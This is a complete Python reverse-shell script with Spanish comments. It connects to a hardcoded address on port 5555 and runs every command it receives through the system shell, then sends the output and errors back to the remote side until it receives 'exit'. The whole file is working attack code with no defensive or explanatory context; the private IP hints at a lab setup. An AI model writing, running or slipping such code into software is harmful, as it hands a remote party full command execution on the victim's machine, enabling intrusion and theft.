import socket
import subprocess

def run():
    # Configuración de la dirección IP y el puerto
    ip = "192.168.249.128"  # Cambia esto por la IP deseada
    port = 5555  # Cambia esto por el puerto deseado

    # Crear un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectar al servidor
    s.connect((ip, port))

    # Bucle infinito para recibir y ejecutar comandos
    while True:
        # Recibir el comando
        command = s.recv(1024)

        # Verificar si el comando es "exit"
        if command == b"exit":
            break

        # Ejecutar el comando
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, err = p.communicate()

        # Enviar la salida del comando
        s.sendall(output)

        # Enviar el error del comando
        s.sendall(err)

def main():
    # Ejecutar la función de shell inverso
    run()

if __name__ == "__main__":
    main()
